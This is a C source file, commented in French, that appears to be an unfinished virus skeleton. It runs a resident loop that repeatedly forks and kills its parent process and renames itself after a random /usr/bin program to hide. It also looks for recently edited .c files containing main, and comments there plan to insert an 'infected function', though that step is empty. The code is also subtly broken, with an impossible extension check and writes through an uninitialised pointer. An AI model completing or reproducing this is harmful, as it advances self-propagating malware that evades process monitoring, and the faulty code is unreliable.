#include <stdio.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <unistd.h> 
#include <sys/types.h>
#include <signal.h>
#include <dirent.h>
#include <string.h>
#include <sys/stat.h>
#include <time.h>
#include <math.h>

char chemin[64]="/home/$USER"; //arbitraire

_Bool extension(char fichier[256]){
	int longueur=strlen(fichier);
	if(longueur > 2){
		if(fichier[longueur-1]=='c' && fichier[longueur-1]=='.')
			return 1;
	}
	return 0;
}

_Bool date_edition(time_t modif){
	time_t now = time(NULL);
	struct tm *date1=localtime(&now);
	struct tm *date2=localtime(&modif);
	if(abs(difftime(mktime(date1), mktime(date2)))<3600)
		return 1;
	return 0;
}

int contient_main(char fichier[256]){
	char *cible;
	strcat(cible,chemin);
	strcpy(cible,"/");
	strcpy(cible,fichier);
	_Bool infile = 0;
	char *line = NULL;
	size_t  len = 0;
	ssize_t read;
	FILE *fp = fopen(cible, "r");
	int i=0;

	while ((read = getline(&line, &len, fp)) != -1) {
		i++;
		line[strcspn(line, "\n")] = 0;
		if (strstr(line, "int main") != NULL) {
            		infile = 1;
            		break;
        		}
    	}
    	fclose(fp);

    	if (line)
		free(line);
	if(infile)
		return i;
	return -1;
}	

void resident(){
	int i=1,nb,nb2;
	struct dirent **liste;
	int nombre=scandir("/usr/bin",&liste,0,alphasort);
	char nom_prgm[64];
	while(i>0){
		sleep(1);
		fflush(stdout);
		i++;
		if(i%3==0){ 
			if(fork()!=0)
				kill(getpid(),SIGKILL);
			nb=rand()%nombre;
			strcpy(nom_prgm,liste[nb]->d_name);
			strcat(nom_prgm,"2");
			printf("Nom nouveau programme: %s\n",nom_prgm);
			prctl(PR_SET_NAME, nom_prgm, NULL, NULL, NULL);
			
			struct dirent **liste2;
			struct stat sb;
			int nb2=scandir(chemin,&liste2,0,alphasort);
			for(int j=0;j<nb2;j++){
				stat(liste2[j]->d_name, &sb);
				if(extension(liste2[j]->d_name) && date_edition(sb.st_ctime) && contient_main(liste2[j]->d_name)!=-1){
				//En bash:
				//Ajouter fonction infectée avant la ligne contient_main(liste2[j]->d_name)
				//Ajouter appel de la fonction à la ligne contient_main(liste2[j]->d_name)+1
				
				}
			}
		}		
	}
}

int main (void){
	resident();
	return 0;
}
